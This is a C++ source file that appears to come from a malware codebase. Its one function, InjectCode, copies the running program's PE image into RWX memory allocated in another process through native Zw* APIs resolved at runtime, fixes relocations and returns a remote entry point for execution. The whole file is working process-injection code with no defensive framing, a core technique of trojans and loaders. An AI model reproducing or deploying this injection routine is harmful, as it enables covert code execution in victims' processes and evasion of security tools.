#include "core\injects.h"
#include "core\pe.h"

SIZE_T InjectCode( HANDLE hprocess, typeFuncThread startFunc, HMODULE* newBaseImage )
{
	HMODULE hmodule = (HMODULE)PE::GetImageBase(startFunc);

	PIMAGE_DOS_HEADER pdh = (PIMAGE_DOS_HEADER)hmodule;
	PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS) ((byte*)pdh + pdh->e_lfanew);

	SIZE_T size = pe->OptionalHeader.SizeOfImage;
	void* newAddr = Mem::Alloc(size);
	if( !newAddr ) return -1;
	Mem::Copy( newAddr, hmodule, size );

	void* ptrNewModule = nullptr;
	SIZE_T addr = 0;

	if ( API(NTDLL, ZwAllocateVirtualMemory)( hprocess, &ptrNewModule, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) == STATUS_SUCCESS )
	{

		ULONG relRVA   = pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
		ULONG relSize  = pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

		PE::ProcessRelocs( (PIMAGE_BASE_RELOCATION)( (SIZE_T)hmodule + relRVA ), (SIZE_T)newAddr, (SIZE_T)ptrNewModule - (SIZE_T)hmodule, relSize );		

		if ( API(NTDLL, ZwWriteVirtualMemory)( hprocess, ptrNewModule, newAddr, size, nullptr ) == STATUS_SUCCESS )
		{
			addr = (SIZE_T)startFunc - (SIZE_T)hmodule + (SIZE_T)ptrNewModule;
		}
		
		//DWORD oldProtect = 0;
		//pZwProtectVirtualMemory( hProcess, (PVOID*)&hNewModule, &dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect );
	}
	if( newBaseImage ) *newBaseImage = (HMODULE)ptrNewModule;
	Mem::Free(newAddr);
	
	return addr;
}
